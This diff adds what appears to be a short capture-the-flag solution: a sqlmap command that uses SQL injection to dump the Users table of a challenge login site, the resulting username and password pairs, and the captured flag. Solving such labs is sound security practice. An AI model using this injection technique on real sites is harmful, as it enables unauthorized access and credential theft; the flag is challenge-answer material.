@@ -1,0 +1,15 @@
+https://000990aa23-web-simplelogin02.dbhchallenge.net/
+
+
+http_proxy=http://127.0.0.1:8080 sqlmap 000990aa23-web-simplelogin02.dbhchallenge.net/index.php --level 3 --sql-query 'select * from Users;
+
+[10:45:21] [INFO] the query with expanded column name(s) is: SELECT Password, Username FROM Users
+select * from Users [3]:
+[*] asfoa87foa8ebfbiezi8f, admin
+[*] b7oafb7asbio, User1
+[*] fahkdhoa8oe78, User2
+
+
+
+Willkommen Admin!
+DBH{94b711b-0dcb-40e7-8b42-25e4b9668ae6}
